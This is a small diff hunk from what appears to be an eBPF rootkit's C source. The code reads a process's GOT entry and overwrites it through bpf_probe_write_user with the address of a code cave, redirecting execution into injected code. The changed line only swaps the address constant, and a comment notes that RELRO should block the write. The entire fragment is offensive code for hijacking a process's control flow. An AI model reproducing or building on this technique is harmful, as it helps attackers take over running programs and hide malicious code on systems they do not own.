@@ -164,7 +164,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         bpf_probe_read_user(&got_addr, sizeof(__u64), j_addr);
         bpf_printk("GOT_ADDR: %lx\n",got_addr);
 
-        __u64 buf = CODE_CAVE_ADDRESS;
+        __u64 buf = (__u64)CODE_CAVE_ADDRESS_STATIC;
         bpf_printk("Now writing to J_ADDR %lx\n", j_addr);
         if(bpf_probe_write_user(j_addr, &buf, sizeof(__u64))<0){
             //Should not work if RELRO active
